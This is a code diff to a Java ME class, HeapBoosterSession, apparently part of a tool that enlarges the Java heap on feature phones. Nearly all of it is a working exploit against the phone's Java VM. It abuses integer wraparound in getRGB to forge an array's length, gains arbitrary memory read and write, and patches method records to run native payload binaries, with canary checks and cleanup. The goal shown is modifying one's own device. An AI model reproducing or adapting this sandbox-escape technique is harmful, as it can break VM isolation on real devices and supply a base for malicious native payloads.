@@ -16,28 +16,54 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
     private static final int LENGTH = 0x40000000;
     final HeapBoosterProfile profile;
     final HeapPatchResolver resolver;
+    final HeapGrowthResolver growth;
+    // Resolve the owning Class through the VM before the raw memory interval.
+    // KVM Class references are the class descriptors used by method records.
+    private final Class ownerClass = getClass();
     final int[] result = new int[RESULT_WORDS];
     static final int PREPARE = 0, MEMORY_VIEW = 1, DISCOVERY = 2, METHOD_LOOKUP = 3, INSTALL = 4,
                      NATIVE_CALL = 5, CLEANUP = 6;
     int error, stage;
+    int anchoredClass, openedViewBase, lookupViewBase;
     boolean needsRestart, nativeCalled;
     Throwable failure;
     private byte[] binary;
+    private byte[] quotaBinary, growthBinary, fixedBinary;
     private int bindingOffset;
-    private int[] codeBackup, canary, target, destination;
+    private int[] codeBackup, canary, target;
     private Object[] box;
     private int base, method, carrier, payloadCode;
     private boolean forged, methodChanged, literalsChanged, canaryChanged, payloadChanged;
     private boolean codeSpaceLoaded;
+    private boolean resetBound;
     private int saved0, saved1, saved2, saved3;
     private static native void nativeQuery();
 
     HeapBoosterSession(HeapBoosterProfile p) {
         profile = p;
         resolver = new HeapPatchResolver(p);
+        growth = new HeapGrowthResolver(p);
     }
     void execute(int operation, int mib) {
         executeTo(operation, mib, NATIVE_CALL);
+        finishReset();
+    }
+    /**
+     * Runs immediately after executeTo()'s entire finally cleanup, before
+     * reporting/RMS allocations. This second native entry lives in OS memory
+     * and unbinds itself before queuing the firmware VM reset.
+     */
+    void finishReset() {
+        if (forged || !resetBound || error != 0)
+            return;
+        resetBound = false;
+        try {
+            nativeQuery();
+        } catch (Throwable t) {
+            failure = t;
+            error = 220;
+            needsRestart = true;
+        }
     }
     /** Diagnostic stop points always use Check; none requests a quota write. */
     void probe(int lastStage) {
@@ -51,6 +77,7 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
         stage = PREPARE;
         nativeCalled = false;
         error = 0;
+        anchoredClass = openedViewBase = lookupViewBase = 0;
         failure = null;
         resolver.reset();
         for (int i = 0; i < result.length; i++)
@@ -77,8 +104,8 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
     }
     /** Shared by every device. Only the profile and native mapping backend vary. */
     private int chain(int operation, int mib, int lastStage) throws IOException {
-        if (lastStage < MEMORY_VIEW || lastStage > NATIVE_CALL
-                || operation < OP_CHECK || operation > OP_RESTORE
+        if (lastStage < MEMORY_VIEW || lastStage > NATIVE_CALL || operation < OP_CHECK
+                || operation > OP_RESTORE
                 || (operation == OP_APPLY && !HeapPatchResolver.choice(mib)))
             return 1;
         int status = prepare();
@@ -93,6 +120,9 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
         if (status != 0 || lastStage == DISCOVERY)
             return status;
         stage = METHOD_LOOKUP;
+        lookupViewBase = target[7] + 12;
+        if (lookupViewBase != base)
+            return 24;
         status = findMethods(target[6]);
         if (status != 0 || lastStage == METHOD_LOOKUP)
             return status;
@@ -106,9 +136,10 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
         return result[W_MAGIC] == MAGIC ? result[W_STATUS] : 18;
     }
     private int prepare() throws IOException {
-        if (binary == null) {
-            binary = readResource();
-            if (binary.length == 0 || binary.length > 8192 || (binary.length & 3) != 0) {
+        if (quotaBinary == null) {
+            binary = readResource(profile.payloadResource());
+            if (binary.length == 0 || binary.length > PAYLOAD_CAPACITY
+                    || (binary.length & 3) != 0) {
                 binary = null;
                 return 3;
             }
@@ -122,7 +153,21 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
                 binary = null;
                 return 3;
             }
+            quotaBinary = binary;
+            if (profile.backend == ARMV6_XGOLD) {
+                growthBinary = readResource("/ram_booster_growth.bin");
+                if (growthBinary.length == 0 || growthBinary.length > PAYLOAD_CAPACITY
+                        || (growthBinary.length & 3) != 0)
+                    return 3;
+            }
+            if (profile.backend == ARM926_RAP) {
+                fixedBinary = readResource("/ram_booster_fixed.bin");
+                if (fixedBinary.length == 0 || fixedBinary.length > PAYLOAD_CAPACITY
+                        || (fixedBinary.length & 3) != 0)
+                    return 3;
+            }
         }
+        binary = quotaBinary;
         if (carrierSwitch(0) != 1)
             return 4;
         // The VM allocates executable bytecode separately on RAPU, while its
@@ -147,27 +192,32 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
         canary = null;
         box = null;
         target = null;
-        destination = null;
         method = carrier = payloadCode = 0;
         forged = methodChanged = literalsChanged = canaryChanged = payloadChanged = false;
         System.gc();
-        // After this five-object group, until restore() repairs the array length:
-        // no allocations, UI, logging, resource loading or GC. Order fixes offsets.
-        codeBackup = new int[2048];
+        // After this four-object group, until restore() repairs the array length:
+        // no allocations, UI, logging, resource loading or GC. The canary checks
+        // the expected spacing; the initial write must not depend on that spacing.
+        codeBackup = new int[PAYLOAD_CAPACITY / 4];
         canary = new int[2];
         box = new Object[4];
         target = new int[1];
-        destination = new int[8];
         canary[0] = 0x13579BDF;
         canary[1] = 0x2468ACE0;
         box[0] = codeBackup;
-        box[1] = this;
+        box[1] = ownerClass;
         box[2] = target;
         box[3] = result;
-        source.getRGB(destination, 0x4000000B, 0x40000001, 0x40000000, 0, 0x40000001, 1);
+        // Native destination = this array's data + 4*offset (32-bit wrap).
+        // Address its OWN length, independent of neighbouring allocations.
+        try {
+            source.getRGB(target, 0x3FFFFFFF, 0x40000001, 0x40000000, 0, 0x40000001, 1);
+        } finally {
+            // Also repair the length if getRGB wrote it and then threw.
+            forged = target.length != 1;
+        }
         if (target.length != LENGTH)
             return 6;
-        forged = true;
         if (target[13] != 0x13579BDF || target[14] != 0x2468ACE0)
             return 7;
         canaryChanged = true;
@@ -176,12 +226,16 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
             return 8;
         target[13] = 0x13579BDF;
         canaryChanged = false;
-        int payloadObject = target[5], sessionObject = target[6], targetObject = target[7],
+        int payloadObject = target[5], classObject = target[6], targetObject = target[7],
             resultObject = target[8];
-        if (!alignedRam(payloadObject, 8204) || !alignedRam(sessionObject, 4)
-                || !alignedRam(targetObject, 16) || !alignedRam(resultObject, 268))
+        anchoredClass = classObject;
+        result[W_OWNER] = classObject;
+        if (!alignedRam(payloadObject, PAYLOAD_CAPACITY + 12) || !alignedRam(classObject, 40)
+                || !alignedRam(targetObject, 16)
+                || !alignedRam(resultObject, RESULT_WORDS * 4 + 12))
             return 9;
         base = targetObject + 12;
+        openedViewBase = base;
         return 0;
     }
     private int discoverPolicy(int operation, int mib) {
@@ -192,7 +246,53 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
         result[W_CURRENT_MIB] = resolver.currentMiB;
         if (!resolved)
             return resolver.error;
-        if (operation == OP_APPLY && (mib * 1048576 > resolver.poolBytes))
+        if (resolver.fixedHeapState != 0) {
+            int heap = resolver.fixedHeapState;
+            int activeBase = read(heap + resolver.fixedHeapBaseOffset),
+                activeBytes = read(heap + resolver.fixedHeapSizeOffset);
+            result[W_HEAP_BASE] = activeBase;
+            result[W_RESERVATION] = activeBytes;
+            if (activeBase != resolver.poolBase || activeBytes != resolver.poolBytes) {
+                // A changed supplier takes effect only when the VM restarts.
+                // Do not advertise or apply a quota against a future arena.
+                result[W_POOL_BYTES] = alignedRam(activeBase, activeBytes) ? activeBytes : 0;
+                return 25;
+            }
+        }
+        boolean expanded = growthBinary != null && growth.resolve(target, base);
+        boolean fixed = fixedBinary != null && resolver.fixedHeapState != 0
+                && resolver.fixedConfigSite != 0 && resolver.fixedResetHelper != 0
+                && resolver.fixedGrowthBytes != 0;
+        if (expanded && (operation != OP_APPLY || mib >= 4 || growth.shrinkHooked != 0)) {
+            growth.fill(result, operation, mib);
+            binary = growthBinary;
+        } else if (fixed
+                && (operation != OP_APPLY || mib * 1048576 > resolver.poolBytes
+                        || resolver.poolBytes == resolver.fixedGrowthBytes)) {
+            result[F_PROVIDER] = resolver.poolProvider;
+            result[F_HEAP_STATE] = resolver.fixedHeapState;
+            result[F_CONFIG_SITE] = resolver.fixedConfigSite;
+            result[F_RESET_HELPER] = resolver.fixedResetHelper;
+            result[F_RESET_FLAG] = resolver.fixedResetFlag;
+            result[F_BASE_LITERAL] = resolver.poolBaseLiteral;
+            result[F_SIZE_INSTRUCTION] = resolver.poolSizeInstruction;
+            result[F_CLEAR_HELPER] = resolver.poolClear;
+            binary = fixedBinary;
+        }
+        if (binary != quotaBinary) {
+            int matches = 0;
+            for (int i = 0; i < binary.length; i += 4)
+                if (binaryWord(i) == 0xB0057E01) {
+                    bindingOffset = i;
+                    matches++;
+                }
+            if (matches != 1)
+                return 3;
+        }
+        result[W_PAYLOAD_BYTES] = binary.length;
+        if (operation == OP_APPLY && (mib * 1048576 > resolver.poolBytes)
+                && !(expanded && mib >= 4 && mib <= 6)
+                && !(fixed && mib <= resolver.fixedQuotaLimit))
             return 10;
         // Mapping policy is data passed to the architecture backend. Quota sizes
         // come from the discovered pool, never a model/firmware size allowlist.
@@ -242,10 +342,11 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
             return 17;
         return 0;
     }
-    private int findMethods(int sessionObject) {
+    private int findMethods(int owner) {
         // This final concrete class owns all three methods. A superclass's table or
         // different VM record layout cannot be substituted by changing a map.
-        int owner = read(sessionObject);
+        // The Object[] holds the VM-resolved Class directly. Do not dereference
+        // a raw instance address after first-use helper loading / long scans.
         result[W_OWNER] = owner;
         if (!alignedRam(owner, 40))
             return 11;
@@ -291,10 +392,11 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
             // (RAPU changes ireturn to D5/D6). Match the invariant iconst bytes
             // at the tail, not VM-private return encodings. The lookup table
             // and its size still identify the reserved storage independently.
-            if (code != 0 && args == 2 && (flags & 0x108) == 8 && (read(m + 16) & 65535) == 8208
-                    && (code & 3) == 0 && read(code) == 0x0000AB1A && read(code + 8) == 0x00040000
+            if (code != 0 && args == 2 && (flags & 0x108) == 8
+                    && (read(m + 16) & 65535) == PAYLOAD_CAPACITY + 16 && (code & 3) == 0
+                    && read(code) == 0x0000AB1A && read(code + 8) == 0x00060000
                     && read(code + 12) == 0x00000100
-                    && (read(code + 8204) & 0x00FF00FF) == 0x00040003) {
+                    && (read(code + PAYLOAD_CAPACITY + 12) & 0x00FF00FF) == 0x00040003) {
                 if (payloadCode != 0)
                     return 22;
                 payloadCode = code;
@@ -315,9 +417,18 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
             return;
         boolean restored = true;
         if (methodChanged) {
-            write(method + 4, 0);
-            if (read(method + 4) != 0)
+            int resetEntry = error == 0 && result[W_MAGIC] == MAGIC && result[W_STATUS] == 0
+                            && result[W_GROWTH_KIND] == 2 && result[W_GROWTH_STATE] == 1
+                    ? result[F_RESET_STUB]
+                    : 0;
+            if (resetEntry != 0 && !alignedRam(resetEntry, 52)) {
+                resetEntry = 0;
                 restored = false;
+            }
+            write(method + 4, resetEntry);
+            if (read(method + 4) != resetEntry)
+                restored = false;
+            resetBound = resetEntry != 0;
             methodChanged = false;
         }
         if (literalsChanged) {
@@ -335,6 +446,10 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
         if (canaryChanged) {
             target[13] = 0x13579BDF;
             canaryChanged = false;
+        }
+        if (!restored && resetBound) {
+            write(method + 4, 0);
+            resetBound = false;
         }
         // 32-bit wrap: base + 4*0x3fffffff == base-4, the array length word.
         target[0x3FFFFFFF] = 1;
@@ -394,8 +509,8 @@ final class HeapBoosterSession implements HeapBoosterProtocol {
         return (binary[i] & 255) | ((binary[i + 1] & 255) << 8) | ((binary[i + 2] & 255) << 16)
                 | (binary[i + 3] << 24);
     }
-    private byte[] readResource() throws IOException {
-        InputStream in = HeapBoosterSession.class.getResourceAsStream(profile.payloadResource());
+    private byte[] readResource(String name) throws IOException {
+        InputStream in = HeapBoosterSession.class.getResourceAsStream(name);
         if (in == null)
             throw new IOException("Missing payload");
         ByteArrayOutputStream out = new ByteArrayOutputStream();
